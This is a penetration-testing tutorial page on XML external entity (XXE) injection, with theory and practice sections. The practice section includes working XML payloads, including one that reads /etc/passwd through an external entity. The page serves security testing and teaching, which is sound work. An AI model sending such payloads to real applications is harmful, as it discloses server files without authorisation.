# XXE injection

## Theory

Some web applications handle data and rely on the XML format to exchange data with the browsers.

> XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.
>
> XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data ([portswigger](https://portswigger.net/web-security/xxe)).

XXE injections can sometimes lead to [SSRF (Server-Side Request Forgery)](../../web/inputs/ssrf.md), Local File Disclosure, Sensitive Information Disclosure, Data Exfiltration, RCE (Remote Code Execution) and so on.

## Practice

Testers need to find input vectors and forms that send XML formatted data to the application.

For instance, in the following request, the user submitted a search form with the input "TESTINPUT".

```http
POST /action HTTP/1.1
Host: some.website
[...]
Connection: close

<?xml version="1.0"?>
<searchForm>  
         <from>TESTINPUT</from>
</searchForm>
```

The tester can detect if the XML parser parses the external entities by defining one inside a `DOCTYPE` element, and checking if the value in the `from` element gets replaced (the value will be replaced in the reflected messages sent by the application like error messages, search results).

```markup
<?xml version="1.0"?>
<!DOCTYPE xxeinjection [ <!ENTITY newfrom "VULNERABLE"> ]>
<searchForm>  
         <from>&newfrom;</from>
</searchForm>
```

A vulnerable application should replace the value by "VULNERABLE". The tester can then try to disclose local files by replacing the `from` value with the content of a sensitive file (e.g. `/etc/passwd`).

```markup
<?xml version="1.0"?>
<!DOCTYPE xxeinjection [ <!ENTITY newfrom SYSTEM "file:///etc/passwd"> ]>
<searchForm>
  <from>&newfrom;</from>
</searchForm>
```

## References

{% embed url="https://portswigger.net/web-security/xxe" %}

{% embed url="https://enciphers.com/how-to-exploit-xxe-vulnerabilities/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" %}
